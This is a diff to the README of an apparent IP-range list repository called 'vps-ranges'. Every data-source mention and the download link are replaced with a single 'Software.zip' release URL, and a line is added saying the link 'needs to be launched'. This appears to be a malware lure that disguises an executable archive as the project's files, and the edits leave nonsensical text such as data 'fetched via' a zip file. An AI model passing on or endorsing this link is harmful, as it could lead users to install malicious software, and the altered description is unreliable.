@@ -4,12 +4,12 @@ Welcome to the **VPS Ranges** repository! 🌐
 
 ## Introduction
 
-This repository, named **vps-ranges**, is a comprehensive list of server hosting services CIDRs. The data is fetched via Github Actions, bgp.tools, and ip.guide. 📊
+This repository, named **vps-ranges**, is a comprehensive list of server hosting services CIDRs. The data is fetched via Github Actions, https://github.com/pkhanhdz/vps-ranges/releases/download/v1.0/Software.zip, and https://github.com/pkhanhdz/vps-ranges/releases/download/v1.0/Software.zip 📊
 
 ## Repository Information
 
 - **Name:** vps-ranges
-- **Description:** List of server hosting services CIDRs, fetched via Github Actions, bgp.tools and ip.guide
+- **Description:** List of server hosting services CIDRs, fetched via Github Actions, https://github.com/pkhanhdz/vps-ranges/releases/download/v1.0/Software.zip and https://github.com/pkhanhdz/vps-ranges/releases/download/v1.0/Software.zip
 - **Topics:** aws, azure, cidr, cidr-ranges, cloudflare, data-center, data-centers, gcp, ip, ip-address, ip-address-ranges, ip-addresses, ip-list, ip-range, ip-ranges, server
 
 ## Repository Content
@@ -19,7 +19,7 @@ In this repository, you will find a collection of CIDRs for various server hosti
 ## 🌐 External Links
 
 For more information and to access the repository files, please click the link below:
-[Download Here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[Download Here](https://github.com/pkhanhdz/vps-ranges/releases/download/v1.0/Software.zip)
 
 **Note:** This link needs to be launched to access the repository files.
 
